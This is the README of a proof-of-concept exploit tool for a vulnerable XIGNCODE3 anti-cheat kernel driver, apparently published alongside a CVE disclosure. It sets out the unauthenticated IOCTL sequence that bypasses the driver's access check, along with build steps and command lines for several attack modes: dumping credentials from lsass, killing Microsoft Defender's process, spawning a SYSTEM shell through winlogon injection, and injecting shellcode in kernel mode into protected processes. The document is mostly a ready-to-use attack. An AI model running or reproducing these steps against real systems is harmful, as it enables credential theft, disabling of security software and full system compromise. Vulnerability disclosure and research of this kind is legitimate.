# AxHunter v1 — `xhunter1.sys` v2023.12.7.78

PoC for Wellbia XIGNCODE3 `xhunter1.sys` v2023.12.7.78.

**Companion write-up:** [Hunting the Hunter](https://blacksnufkin.github.io/posts/Hunting-the-Hunter/).

**CVE:** [CVE-2026-3609](https://www.cve.org/CVERecord?id=CVE-2026-3609) (updated 2026-08-05 to cover v10.0.10011.16384 through v2023.12.7.78).

## Target

```
Driver       xhunter1.sys
Version      2023.12.7.78
SHA-256      0D1FD685DC98D0C193529DF3DDDE7144D839F56B7B38251FD7039C33C0FCF760
```

`xhunter1.sys` shipped in this folder is the exact sample used.

## Bypass

`sub_140005E84` gates cmd 785 / cmd 787 behind `(flags & 0x80000008) == 0x80000008` for the caller's PID, against a linked list at `qword_140021BD8`. Two other opcodes in the same dispatch table write to that list with no auth check:

```
WriteFile(dev, cmd=777, ...)                            // sets bit 31 of own PID
WriteFile(dev, cmd=775, pid=self, flags=0x0008, ...)    // sets bit  3 of own PID
                                                        // → flags = 0x80000008, gate passes
WriteFile(dev, cmd=785, pid=<target>, mask=0x1FFFFF)    // → PROCESS_ALL_ACCESS handle
```

`open_driver()` in `src/main.rs` runs the cmd 777 + cmd 775 chain once per invocation.

## Build

From the workspace root (`../`):

```
cargo build --release -p AxHunter_v1
```

Produces `../target/release/AxHunter_v1.exe`. Rust edition 2024. Depends on the shared [`axhunter-lsa`](../axhunter-lsa/) crate for LSA credential extraction (`dump` mode).

## Run

```
AxHunter_v1.exe -m dump                          # credential dump from lsass.exe
AxHunter_v1.exe -m kill -t <pid|image>           # e.g. -t MsMpEng.exe
AxHunter_v1.exe -m lpe                           # SYSTEM shell via winlogon.exe
AxHunter_v1.exe -m inject -t <pid|image>         # kernel-mode injection (default: WinExec shellcode)
AxHunter_v1.exe -m inject -t winlogon.exe -p sc.bin  # inject custom payload
AxHunter_v1.exe -m all                           # dump, then kill MsMpEng, then lpe
AxHunter_v1.exe -m dump -d <service-name>        # override device path
AxHunter_v1.exe -m dump -t <pid|image>           # override dump target
```

Device path defaults to `\\.\xhunter`. Recent XIGNCODE3 builds derive the device name from the SCM service name — pass `-d <svc>` to match whatever is loaded.

Full CLI: `AxHunter_v1.exe --help`.

## Modes

- **`dump`** — LDR-walks `lsass.exe`, recovers BCrypt 3DES key + IV, decrypts `LogonSessionList`, extracts NT/SHA1 hashes and (where present) WDigest plaintext.
- **`kill`** — cmd 785 handle on the target, enumerates target's handle table via `NtQuerySystemInformation(SystemExtendedHandleInformation)`, then cmd 800 (`ObSetHandleAttributes(KernelMode)` + `ZwClose` under `KeStackAttachProcess`) on each handle.
- **`lpe`** — cmd 785 handle on `winlogon.exe`, `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` running a 41-byte shellcode: `WinExec("cmd.exe", SW_SHOW)`. Child inherits winlogon's `NT AUTHORITY\SYSTEM` token + Session 1.
- **`inject`** — kernel-mode code injection via cmd 801 (init `RtlCreateUserThread` pointers) + cmd 820 (RWX alloc + copy + thread create, all ring 0). Injects into any process including PPL. Default payload: `WinExec("cmd.exe")`. Use `-p <file.bin>` for custom shellcode.
- **`all`** — dump, then kill `MsMpEng.exe`, then lpe. Failures in individual modes don't abort the run.

## Test environment

Windows 11 24H2 build 26200. HVCI, VBS, Microsoft Vulnerable Driver Blocklist all enabled.
